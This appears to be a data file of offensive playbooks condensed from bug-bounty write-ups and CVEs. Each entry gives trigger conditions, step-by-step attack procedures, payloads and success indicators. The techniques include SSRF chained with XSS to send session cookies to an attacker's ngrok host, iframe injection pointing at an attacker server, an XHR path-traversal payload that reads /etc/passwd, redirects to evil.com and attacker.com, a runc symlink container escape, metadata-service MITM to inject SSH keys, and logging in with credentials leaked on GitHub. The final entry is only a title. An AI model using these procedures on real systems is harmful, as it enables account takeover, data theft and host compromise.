playbooks.key_lesson: Always investigate how author attribution and security warnings are determined in collaborative platforms; investigate the ability to manipulate ownership or author fields to bypass these trust mechanisms.

meta.title: Story of my first cash bounty on hackerone.

trigger_conditions.when_to_apply: When a web application endpoint accepts a URL without a scheme (http/https) as a parameter, and it appears to be processing image resources.
prerequisites: Attacker must have an authenticated session with the target application.
applicability_signals: Endpoint URL pattern like /image?Id=<value_without_scheme>
Parameter accepts external domain names directly without http/https prefix.
skip_if: The Id parameter always requires http:// or https:// prefix.
Initial SSRF attempts to a collaborator tool yield no requests.
All requests to the Id parameter are blocked by a WAF or server-side validation.

recon_steps: Step 1: Use 'linkfinder.py' to discover hidden or less obvious endpoints and parameters.
Step 2: Analyze discovered URLs for parameters that accept external resource identifiers without proper URL schemes (e.g., 'Id=somedomain.com' instead of 'Id=http://somedomain.com').
attack_steps: Step 1: Attempt an initial SSRF by providing a collaborator payload directly into the 'Id' parameter without any scheme (e.g., Id=your.collaborator.net).
Step 2: If initial SSRF fails (e.g., only DNS lookup), prepend '@' to the collaborator payload (e.g., Id=@your.collaborator.net) and check for HTTP requests in the collaborator.
Step 3: If SSRF is confirmed but impact is not immediately obvious (e.g., no AWS metadata accessible), attempt to chain it with another vulnerability like XSS.
Step 4: Create an HTML file hosted on a controlled server (e.g., ngrok, localhost) containing an XSS payload designed to steal session cookies.
Step 5: Use the SSRF vulnerability to force the target application to fetch the malicious HTML file (e.g., Id=your.ngrok.io/malicious.html).
Step 6: Monitor the controlled server for incoming cookie data from exploited victim accounts.
tools_recommended: linkfinder.py: For discovering endpoints.
Burp Suite Collaborator: For detecting SSRF callbacks.
ngrok: For hosting attacker-controlled HTML files locally.
success_indicators: Receiving DNS requests and/or HTTP requests in Burp Collaborator from the target server.
Successful execution of XSS payload and retrieval of victim session cookies on the attacker's controlled server.
failure_indicators: No callbacks received in Burp Collaborator for any payload variations → The parameter does not perform SSRF or is heavily filtered.
SSRF callback received but no AWS metadata accessible and XSS chaining fails → Re-evaluate if the SSRF can be used for other purposes or if the XSS payload needs modification.

playbooks.impact: Attacker can steal session cookies of authenticated users, leading to account takeover.
playbooks.key_lesson: Always investigate URL parameters that lack explicit schemes (http/https) as they can be vulnerable to SSRF. Chain SSRF with other vulnerabilities like XSS for higher impact when direct data exfiltration is not immediately possible.

meta.title: Pop-Ups in a good-world

trigger_conditions.when_to_apply: This technique is applicable when a target website allows JavaScript execution and interaction with its content via pop-up windows, and when certain browser behaviors, like the handling of drag events within new windows, can be leveraged.
prerequisites: The target website must be vulnerable to Cross-Site Scripting (XSS) that can be triggered within a context that can be manipulated by pop-up windows or drag events.
applicability_signals: The presence of functionality that opens new windows or pop-ups.
The website's content is not heavily protected against UI Redressing or Clickjacking.
Browser's observed behavior with `ondrag` events and `window.open` in conjunction.
skip_if: Strong X-Frame-Options or Content Security Policy (CSP) headers that prevent any form of content injection or frame embedding.
Browser's strict popup blocking that prevents even single window openings initiated by JavaScript without direct user interaction.

recon_steps: Step 1: Analyze the target website for any features that utilize pop-up windows or new tab openings.
Step 2: Investigate the behavior of JavaScript `window.open()` calls, especially those not directly triggered by immediate user clicks, to understand popup blocking mechanisms.
Step 3: Test how drag-and-drop events interact with JavaScript and if data transferred via `event.dataTransfer.setData()` can be executed when set within a new window context.
attack_steps: Step 1: Craft an HTML page that includes a JavaScript `ondrag` event listener.
Step 2: Within the `ondrag` event, set the `event.dataTransfer.setData()` with a malicious payload, such as ``.
Step 3: In the same `ondrag` event, use `window.open()` to open a new window pointing to a URL controlled by the attacker or a vulnerable page on the target.
Step 4: Attempt to trigger the drag event programmatically or through a user interaction (if needed) to initiate the payload execution within the new window.
tools_recommended: Browser Developer Tools: To inspect JavaScript execution, event listeners, and `window.open()` behavior.
Custom HTML/JavaScript files: For crafting and testing the attack payloads.
success_indicators: An alert box displaying `document.domain` pops up, confirming XSS execution within the context of the target domain.
Browser console logs indicate the execution of the JavaScript payload.
failure_indicators: No alert box appears and the browser console shows no errors related to the payload execution. This might indicate that the `dataTransfer` data is not being interpreted as executable code in the new window context, or that the `window.open` call is blocked.

A 403 Forbidden or similar error response if the target URL is protected in a way that prevents it from being opened in this manner. Suggestion: investigate alternative payload delivery methods or different browser behaviors.

playbooks.impact: Execution of arbitrary JavaScript code in the context of the target website's domain, allowing for potential data exfiltration (e.g., cookies, session tokens), session hijacking, or further manipulation of the user's interaction with the site.
playbooks.key_lesson: Investigate browser-specific behaviors with drag-and-drop events and pop-up window interactions, as they can sometimes bypass standard security measures and enable XSS execution in unexpected contexts.

meta.title: Android: Exploring vulnerabilities in WebResourceResponse

tech_stack_fingerprints: Presence of WebView components in Android applications
Usage of WebResourceResponse and shouldInterceptRequest methods

trigger_conditions.when_to_apply: When an Android application utilizes `WebResourceResponse` within its `WebViewClient` to serve content based on URL paths, and the path manipulation is not properly validated.
prerequisites: Attacker can trigger XHR requests to the application's WebView.
The application's WebView has a `WebViewClient` implementing `shouldInterceptRequest`.
The `shouldInterceptRequest` method handles requests with a path prefix that maps to local files.
applicability_signals: Observable usage of `shouldInterceptRequest` in the application's code.
Requests to specific URI patterns that are handled by `shouldInterceptRequest`.
The `shouldInterceptRequest` method attempts to read local files based on the request URI.
skip_if: The `shouldInterceptRequest` method does not exist or is not implemented.
The application sanitizes or strictly validates all file paths before accessing them.
Requests to the WebView are not possible or are blocked by network controls.

recon_steps: Step 1: Analyze the target Android application's decompiled code to identify WebView implementations and `WebViewClient` configurations.

Step 2: Specifically look for methods like `shouldInterceptRequest` and examine the logic for handling `WebResourceRequest` objects, paying attention to how request URIs are parsed and used to access local resources.
attack_steps: Step 1: Craft an XHR request that targets the WebView with a crafted URL. The URL should mimic the expected pattern handled by `shouldInterceptRequest` but attempt to navigate to a sensitive file.

Step 2: For example, if the application uses `/local_cache/` prefix for local files and expects the filename as the last path segment, attempt to request a file like `/local_cache/../../../../etc/passwd` (or a path within the app's private storage).
Step 3: Analyze the response received via the XHR request to check for the content of the accessed file.
payloads_or_patterns: XHR request to: `data:text/html,<script>var xhr = new XMLHttpRequest();xhr.open('GET', 'http://<TARGET_URL>/local_cache/../../../../etc/passwd');xhr.send();xhr.onload = function() { console.log(xhr.responseText); };</script>`
tools_recommended: Frida: For dynamic analysis of Android applications to hook into `shouldInterceptRequest` and inspect arguments.
Android Debug Bridge (ADB): To install and interact with the Android application.
success_indicators: The XHR request returns the content of a sensitive local file (e.g., `/etc/passwd`, app's private data files).
The response contains strings or data that should not be publicly accessible.
failure_indicators: The XHR request returns a 404 Not Found or an empty response, indicating the file was not found or not accessible.
The XHR request returns an error message indicating a path traversal attempt was blocked by the application or OS.
The `shouldInterceptRequest` method returns null or calls `super.shouldInterceptRequest`, indicating it didn't handle the request or gracefully failed.

playbooks.impact: An attacker can read arbitrary files from the application's private storage or the device's file system, potentially leading to the exposure of sensitive user data, application configuration, or system files.
playbooks.key_lesson: Always validate and sanitize file paths constructed from user-controlled input in `WebResourceResponse` to prevent arbitrary file read vulnerabilities.

meta.title: XSS in the AWS Console

trigger_conditions.when_to_apply: When an authenticated user is viewing the Elastic Beanstalk Change History page and specific CloudTrail events are missing `requestParameters`.
prerequisites: User must be authenticated into the AWS Console.

The fuzzing framework used by the researcher is implied as a prerequisite for discovering the null `requestParameters` condition, but not strictly required for exploitation if the condition can be manually met.
applicability_signals: An error message related to `b.requestParameters` being null is displayed on the Elastic Beanstalk Change History page.
The AWS Console attempts to render user-provided input (like User Agent) directly into the DOM without proper sanitization.
skip_if: All CloudTrail events are always complete and contain `requestParameters`.
The AWS Console exhibits robust input sanitization for all user-controlled fields displayed on the Change History page.

recon_steps: Step 1: Navigate to the Elastic Beanstalk section of the AWS Console.
Step 2: Access the 'Change history' for an environment.
Step 3: Observe for any error messages, particularly those mentioning `b.requestParameters`.
Step 4: Inspect the page's JavaScript (e.g., beanstalk-xp_en.min.js) to understand how user-controlled input like User Agent and Environment Name are processed and rendered.
attack_steps: Step 1: Craft an AWS API request that triggers an event likely to result in a null `requestParameters` field in CloudTrail (e.g., an `update-environment` action with no parameters).
Step 2: Modify the User-Agent header of this crafted request to contain an XSS payload (e.g., ``).
Step 3: Send the crafted API request.
Step 4: Log into the AWS Console and navigate to the Elastic Beanstalk Change History page to observe the rendered User-Agent string.
Step 5: If the User-Agent is rendered directly and unsanitized, an XSS alert should trigger.
tools_recommended: AWS CLI for crafting API requests, Burp Suite for intercepting and modifying requests, Browser Developer Tools for inspecting JavaScript and DOM.
success_indicators: An alert box pops up in the browser displaying a string like 'xss.oastify.com' or the AWS domain.
The `onerror` JavaScript code executes, confirming XSS.
failure_indicators: The User-Agent string is displayed as plain text or is HTML-encoded (e.g., `<img src=x onerror=alert(1)>`), indicating proper sanitization. In this case, pivot to other user-controlled parameters if available, or other vulnerabilities.
No error message related to `b.requestParameters` appears on the Change History page, suggesting the condition for rendering user input is not met.

playbooks.impact: Execution of arbitrary JavaScript in the context of the logged-in AWS user within the AWS Console, potentially leading to session hijacking, unauthorized actions, data exfiltration, or further exploitation of the AWS environment.
playbooks.key_lesson: Always inspect how user-controlled input, especially from API requests that generate logs or audit trails, is rendered within the application's user interface, as improper sanitization can lead to XSS vulnerabilities even in complex enterprise applications.

meta.title: Exploiting Open Redirect - Whitelist Bypass Using Salesforce Environment

affected_components: Redirects within Salesforce environments, specifically those involving token validation or user redirection.
tech_stack_fingerprints: Salesforce branding in UI, common Salesforce JS patterns, presence of 'Ray ID' header from Cloudflare (indicative of protection often seen with web apps, including those hosted on platforms like Salesforce).

trigger_conditions.when_to_apply: When a web application or service utilizes Salesforce for authentication or redirection, and redirects are not properly validated against an allowlist.
prerequisites: Target system uses Salesforce for redirection or is integrated with it in a way that involves external redirects.
A redirect URL parameter is present and appears to be subject to some form of validation, but this validation can be bypassed.
applicability_signals: Observe redirect URLs with parameters like `redirect_uri`, `returnUrl`, `next`, or similar.
Look for whitelisting mechanisms that can be bypassed (e.g., allowing subdomains or specific URL structures).
skip_if: All redirect URLs are strictly enforced against a hardcoded, exact allowlist and no subdomains or query parameter manipulations are accepted.
WAF blocks common open redirect payloads.

recon_steps: Step 1: Identify redirection points by observing URL parameters that accept URLs after user interactions (e.g., login, logout, OAuth callbacks).
Step 2: Analyze the structure of these redirect URLs and any associated security mechanisms (e.g., token validation, parameter encoding).
attack_steps: Step 1: Attempt to manipulate the redirect URL parameter to point to an attacker-controlled domain. Use common open redirect patterns first (e.g., `//evil.com`, `http://evil.com`, `https://evil.com`).

Step 2: If direct manipulation fails, test bypass techniques. In this specific case, the writeup implies a Salesforce-specific bypass involving manipulating the URL to leverage Salesforce's own redirection logic or token handling.

Step 3: The writeup mentions bypassing a whitelist by using a Salesforce environment. This suggests constructing a URL that appears valid to Salesforce but ultimately redirects to an external, malicious site. A potential example: `<TARGET_URL>/<endpoint>?redirect_to=//attacker.com` or `<TARGET_URL>/<endpoint>?returnUrl=//attacker.com` where the target system's redirection handler, when interacting with Salesforce, fails to properly sanitize `//attacker.com` before redirecting.
tools_recommended: Burp Suite Repeater: To test various redirect URL manipulations.
Burp Collaborator: To confirm successful redirection to an attacker-controlled server.
success_indicators: The user's browser is redirected to an attacker-controlled domain instead of the intended destination.
A callback is received on Burp Collaborator from the target system's IP address, indicating a successful outbound connection initiated by the redirect.
failure_indicators: The target page returns an error or a security warning related to invalid redirect URLs.
The redirect is always to a whitelisted domain, regardless of payload. Pivot: Look for other injection points or business logic flaws.

playbooks.impact: Stealing user session tokens, phishing credentials, or performing other malicious actions by redirecting users to attacker-controlled websites. If the redirect occurs after an authenticated action, sensitive tokens could be leaked.
playbooks.key_lesson: When dealing with redirects originating from or mediated by third-party platforms like Salesforce, carefully examine how the platform's own URL handling interacts with user-supplied parameters to avoid bypasses.

meta.title: CVE-2021-29084: Exploiting CRLF Header Injection in Synology NAS for Unauthenticated File Downloads

trigger_conditions.when_to_apply: When an unauthenticated endpoint reflects user-supplied input into HTTP headers, and the web server (nginx) is configured to use the 'internal' directive with X-Accel-Redirect.
prerequisites: The target must be a Synology NAS device.
An unauthenticated endpoint that reflects user input into HTTP headers must exist.
The web server (nginx) must be configured with the 'internal' directive, specifically for locations that allow 'root /' and include 'app.d/x-accel.*.conf' or 'conf.d/x-accel.*.conf'.
applicability_signals: An endpoint that accepts a 'path' parameter or similar reflective parameter.
Observation of the HTTP response headers showing user-supplied input reflected, especially if a redirect (302) occurs.
The presence of nginx configuration files related to 'x-accel' directives.
skip_if: No apparent header injection vulnerability found.
The server does not respond with nginx as the server software.
The nginx configuration does not utilize 'internal' directives or X-Accel-Redirect in accessible locations.

recon_steps: Step 1: Identify unauthenticated API endpoints on the Synology NAS. For example, use `curl` to probe `/webapi/entry.cgi` with common API calls.

Step 2: Test for header injection by sending requests with CRLF characters (`%0d%0a`) followed by custom headers to parameters that appear to be reflected in the response. Use a tool like `curl -v` to observe the full HTTP response.
attack_steps: Step 1: Craft a request to an endpoint like `/webapi/entry.cgi` that accepts a `path` parameter. Inject CRLF characters and the `X-Accel-Redirect` header.

Step 2: The `path` parameter should be crafted to exploit the CRLF injection to prepend the `X-Accel-Redirect` header. The value of `X-Accel-Redirect` should be a path to a file on the server that you want to download.
Step 3: Observe the HTTP response. If successful, nginx will process the `X-Accel-Redirect` header and return the content of the specified file, often with a 200 OK status code.
tools_recommended: curl: For crafting and sending HTTP requests and observing responses.
Burp Suite: For intercepting and modifying requests, and for automating tests.
success_indicators: HTTP response with a 200 OK status code.
The response body contains the content of the file specified in the `X-Accel-Redirect` header.
The `Location` header is absent or irrelevant to the file download.
failure_indicators: HTTP response with 4xx or 5xx status codes (e.g., 400 Bad Request, 403 Forbidden) not containing the file content.
The injected headers are not processed or are sanitized.
A redirect occurs to an unexpected location without delivering the file content.

playbooks.impact: Unauthenticated users can download arbitrary files from the Synology NAS, including sensitive configuration files or data from shared folders, depending on the `internal` nginx directive's root configuration and knowledge of file paths. This can lead to information disclosure.
playbooks.key_lesson: When user-supplied input is reflected into HTTP headers, test for CRLF injection to inject control headers like `X-Accel-Redirect` when the web server (e.g., nginx with `internal` directive) is known to process them, enabling file disclosure.

meta.title: runc mount destinations can be swapped via symlink-exchange to cause mounts outside the rootfs (CVE-2021-30465)

tech_stack_fingerprints: container runtime using runc (e.g. Docker, Kubernetes)

trigger_conditions.when_to_apply: This vulnerability is applicable when a container runtime, specifically runc, is used to mount volumes within a container, and the target path for the mount can be manipulated via a symlink race condition before the mount is finalized.
prerequisites: Attacker has the ability to create files and symlinks within a container.
Container runtime uses runc.
A volume mount is being performed within the container.
applicability_signals: Observation of `mount` output showing unexpected mount points.
runc source code referencing `securejoin.SecureJoinVFS()` for path validation.
skip_if: Container runtime does not use runc.
No volume mounts are performed within the container.
The container filesystem does not allow symlink creation or manipulation.

recon_steps: Step 1: Identify if the target environment uses runc as its container runtime (common in Kubernetes and Docker environments).
Step 2: Within a test container, execute `mount` command to observe existing mount points and identify potential targets for manipulation. Look for unexpected mounts or symlinks in mount paths.
attack_steps: Step 1: Identify a target directory within the container that is used as a mount destination for a volume.
Step 2: Create a symlink at the target mount path that points to a location outside the container's root filesystem (e.g., `/hostfs/path/to/sensitive/data`).

Step 3: Trigger a volume mount operation that targets the original path. The race condition occurs as runc resolves the path using `filepath-securejoin`, but the symlink might already be in place, redirecting the mount to the host.
Step 4: Attempt to read or write data to the location where the volume was supposed to be mounted, but now access data on the host.
payloads_or_patterns:
# During container setup or before triggering the mount:
# Create a symlink to an external path (e.g., on the host)
ln -s /host/path/to/target /path/inside/container/to/mount

# After mount is supposed to be complete:
# Access data via the original mount path which now points outside the container
cat /path/inside/container/to/mount/sensitive_file.txt
tools_recommended: kubectl: To deploy containers and manage Kubernetes resources.
Docker: For local testing of container behavior.
Bash/Shell: For executing commands within the container.
strace: To trace system calls and understand the mount process.
success_indicators: Reading sensitive files from the host system through the container's mount path.
Writing files to the host system through the container's mount path.
Observing unexpected data in the container that originates from the host filesystem.
failure_indicators: Mount operation fails with an error indicating path traversal or invalid symlink (e.g., 400 Bad Request, permission denied). -> Suggest trying different target paths or timing the symlink creation more precisely.
Mount succeeds but data is still within the container's rootfs. -> Indicates the symlink race was not successful or the target path was not properly vulnerable.

playbooks.impact: Allows an attacker to escape the container and gain unauthorized read and write access to the host filesystem, potentially leading to compromise of the entire host system, other containers, and sensitive data.
playbooks.key_lesson: Always validate and sanitize mount destinations within container runtimes, ensuring that symlinks cannot be used to redirect mounts outside the intended container rootfs.

meta.title: Metadata service MITM allows root privilege escalation (EKS / GKE)

affected_components: Kubernetes nodes with specific container configurations

trigger_conditions.when_to_apply: This attack is applicable when an attacker can deploy a container with `hostNetwork=true` and the `CAP_NET_RAW` Linux capability enabled within a Kubernetes cluster.
prerequisites: Attacker can deploy a pod with `hostNetwork: true`
Container has `CAP_NET_RAW` capability enabled
Cloud provider metadata service is accessible via HTTP and contains sensitive information like SSH keys.
Instances retrieve SSH keys dynamically at runtime over HTTP.
applicability_signals: Pod can be deployed with `hostNetwork: true`
Container has `CAP_NET_RAW` capability
Successful network eavesdropping or injection attempts on the host network
Access to metadata service endpoint `http://169.254.169.254`
skip_if: Container lacks `CAP_NET_RAW` capability
`hostNetwork` is not set to `true` for the container
Metadata service is not accessible
SSH keys are not dynamically retrieved at runtime over HTTP

recon_steps: Step 1: Identify if `CAP_NET_RAW` is enabled in the container runtime and if `hostNetwork=true` can be configured for deployed pods.
Step 2: Attempt to deploy a simple pod with `hostNetwork=true` and verify network connectivity to the metadata service endpoint `http://169.254.169.254`.
attack_steps: Step 1: Deploy a pod with `hostNetwork=true` and `CAP_NET_RAW` enabled. For example, a pod running `tcpdump` or `ping` can leverage these.

Step 2: Within the compromised pod, use tools capable of raw socket manipulation (e.g., `scapy` in Python or custom C code) to perform ARP spoofing or IPv6 rogue router advertisement attacks to intercept or inject traffic on the host network.
Step 3: Intercept or inject traffic directed at `http://169.254.169.254`. The goal is to either steal the user SSH public key or inject a new SSH public key controlled by the attacker.
Step 4: If a new SSH public key is injected, use it to SSH into the compromised node as a privileged user (e.g., root or sudoer).
payloads_or_patterns: Dockerfile snippet for a container with `CAP_NET_RAW` enabled
Kubernetes Pod YAML with `hostNetwork: true` and `capabilities: add: ["NET_RAW"]`
Example Python script using `scapy` for ARP spoofing/IPv6 RA
Payload to inject a public SSH key into the metadata service response or steal existing ones.
tools_recommended: Kubectl: To deploy pods
Scapy: For crafting and sending raw network packets
Custom C program: For low-level network manipulation
tcpdump: To monitor network traffic
SSH client: To connect to the node after successful key injection
success_indicators: Successful ARP spoofing or IPv6 rogue router advertisement
Intercepted metadata service responses containing SSH keys
Successful injection of attacker-controlled SSH public key
Successful SSH login to the Kubernetes node with root or sudo privileges
failure_indicators: Inability to deploy a pod with `hostNetwork=true` or `CAP_NET_RAW`
Network traffic to `http://169.254.169.254` is blocked or uninteresting
Metadata service does not contain SSH keys or is protected by TLS
SSH login fails with the injected key

playbooks.impact: Attacker gains root privilege on the Kubernetes node, allowing for complete control over the node, access to all data on the node, and potential lateral movement within the cluster.
playbooks.key_lesson: When containers have `CAP_NET_RAW` and `hostNetwork=true`, always investigate the possibility of network-based privilege escalation by intercepting or manipulating traffic to critical services like cloud provider metadata endpoints.

meta.title: Account Takeover via iFrame Injection

trigger_conditions.when_to_apply: When a reflected XSS vulnerability is found on a website that is frequently visited by users, especially if it allows iframe injection and can be leveraged to steal session cookies or redirect users to a malicious site.
prerequisites: The target website must be vulnerable to reflected XSS.
The XSS vulnerability must not sanitize `<iframe>` tags or their attributes.
The target website must be accessible by other authenticated users.
applicability_signals: Reflected parameter in the URL (e.g., `language=` or `c=subscribe`).
The target website allows `<iframe>` elements in its responses.
The application sanitizes input but fails to properly escape `<iframe>` tags or their attributes.
skip_if: The website actively blocks `<iframe>` tags or their attributes.
The application performs strict output encoding that prevents `<iframe>` injection.
WAF blocks common XSS payloads including `<iframe>`.

recon_steps: Step 1: Identify parameters in URLs that reflect user input in the response using Burp Suite's Site Map or by manually browsing the application.
Step 2: Test reflected parameters for XSS by injecting simple payloads like `<script>alert(1)</script>` to confirm reflection and identify potential filtering.
Step 3: If basic XSS is blocked, attempt to inject an `<iframe>` tag with a malicious `src` attribute pointing to a server controlled by the attacker (e.g., Burp Collaborator, a custom server).
attack_steps: Step 1: Craft a malicious URL that includes the `<iframe>` injection payload. Example: `https://store.redacted.com/some/dir/store/index.jsp?c=<iframe src='http://attacker-controlled-server.com/redirect.html'></iframe>`
Step 2: Send this crafted URL to other authenticated users via a phishing campaign or by sharing it in a context where they are likely to click it.
Step 3: Monitor the attacker-controlled server for incoming requests, which would indicate the victim's browser loaded the iframe.
Step 4: If the `redirect.html` page on the attacker server attempts to steal cookies or redirect the user, analyze the logs for session tokens or successful redirects.
tools_recommended: Burp Suite: For identifying and testing parameters, and for setting up a collaborator server to capture callbacks.
Custom HTTP Server: To host the malicious `redirect.html` page and log incoming requests.
success_indicators: An incoming HTTP request to the attacker-controlled server from the victim's IP address.
The presence of a session cookie or other sensitive information in the request logs on the attacker-controlled server.
A successful redirection of the victim to a malicious page as observed by the attacker.
failure_indicators: No `<iframe>` tag is rendered in the response, or it's stripped out.
The `src` attribute of the `<iframe>` is sanitized, preventing the loading of external resources.
The website displays an error or a different page instead of reflecting the injected `<iframe>`.

playbooks.impact: Account takeover of authenticated users. If the victim's session cookie can be exfiltrated, the attacker can impersonate the user and perform actions on their behalf, potentially leading to financial loss, data theft, or further compromise.
playbooks.key_lesson: When direct XSS payloads are blocked, explore alternative HTML elements like `<iframe>` which might be less strictly sanitized. Always consider the impact of XSS in conjunction with user interaction, especially for account takeover scenarios.

meta.title: Github, The Goldmine for P1s and P2s - Sensitive Information Exposure via Github by a Company Employee

trigger_conditions.when_to_apply: When searching for sensitive information related to a specific target company within public GitHub repositories.
prerequisites: Knowledge of the target company's domain name or related keywords.
applicability_signals: Presence of repositories related to the target company.
Use of common keywords like 'password', 'secret', 'token', 'api_key' in searches.
skip_if: No relevant repositories found after initial searches.
All findings are clearly marked as test data or are not related to the target.

recon_steps: Step 1: Search GitHub for the target company's domain name and common keywords related to sensitive information (e.g., 'target.com', 'password', 'secret', 'token', 'api_key').

Step 2: Refine searches by excluding terms like 'test', 'sandbox', 'staging', 'development', 'docker', 'help', and by specifying programming languages (e.g., 'language:bash', 'language:python', 'language:xml').
Step 3: Sort results by 'Recently indexed' to find the latest discoveries.
attack_steps: Step 1: Examine search results for files containing potential credentials, API keys, or secrets.
Step 2: If a potential credential is found, analyze its context (e.g., file name, comments, surrounding code) to determine if it's valid or test data.
Step 3: If the credential appears valid and is related to the target company, attempt to use it to access the specified service (e.g., PostgreSQL database, cPanel).
Step 4: If the initial attempt fails (e.g., closed port, invalid credentials), revisit the GitHub repository for more clues or try alternative dorks.
tools_recommended: GitHub search functionality
Custom scripts for automated searching and filtering
success_indicators: Discovery of valid credentials (e.g., username, password, tokens) in plain text within code repositories.
Successful authentication to a target service using discovered credentials.
failure_indicators: All discovered credentials are for test accounts or are clearly marked as non-production.
Ports for discovered services are closed or inaccessible.
Obtained credentials do not grant access to the intended service.

playbooks.impact: Exposure of sensitive information such as database credentials, API keys, or other secrets can lead to unauthorized access to internal systems, data breaches, and further compromise of the target organization's infrastructure.
playbooks.key_lesson: Leverage specific keywords and exclusions in GitHub searches to effectively filter out noise and prioritize finding actual sensitive information leaks related to target companies.

meta.title: Bypassing restricted port protection in WebKit

affected_components: Rendering of web pages that make requests to restricted ports

trigger_conditions.when_to_apply: When a web application utilizes WebKit (Safari) and makes requests to ports that are typically restricted by the browser for security reasons.
prerequisites: The target environment uses Safari or a WebKit-based browser.
applicability_signals: The target application allows arbitrary HTML content to be rendered or submitted.
The target application makes outgoing network requests from the browser.
skip_if: The browser fully blocks all outgoing requests to restricted ports, including the initial request.

recon_steps: Step 1: Identify if the target application allows rendering of arbitrary HTML or submission of forms with custom `action` URLs.
attack_steps: Step 1: Create a local HTML file with a form that targets a restricted port (e.g., 127.0.0.1:6000) using the POST method.
Step 2: Open this HTML file in Safari on a system that can reach the target restricted port.
Step 3: Submit the form with some arbitrary data.
Step 4: On the listening port (e.g., netcat on 127.0.0.1:6000), observe the incoming HTTP request.
payloads_or_patterns:
<form action="http://127.0.0.1:<RESTRICTED_PORT>" method="POST" enctype="multipart/form-data">
  <label for="data">post data:</label>
  <input type="text" id="data" name="data">
</form>
tools_recommended: Netcat: To listen on a specific local port (e.g., `nc -l 127.0.0.1 <RESTRICTED_PORT>`).
Text editor: To create the HTML proof-of-concept.
success_indicators: The restricted port (e.g., 6000) receives an HTTP request, even though Safari displays an error message about restricted ports.
The content of the request (e.g., POST data) is visible in the netcat listener.
failure_indicators: No HTTP request is received on the listening port, indicating the browser completely blocked the request.
The browser returns an error without sending any network traffic to the target port.

playbooks.impact: Allows an attacker to bypass browser-based restricted port blocking, enabling the sending of arbitrary HTTP requests to internal services or services listening on restricted ports (e.g., SMTP on port 25) from the context of the victim's browser. This can lead to interaction with sensitive internal systems.
playbooks.key_lesson: When testing web applications that render user-provided HTML or allow submission to arbitrary URLs, investigate whether restricted port protections are fully enforced by checking if initial requests are blocked or just rendering.

meta.title: GitLab Arbitrary File Read & Write through Kroki - CVE-2021-22203
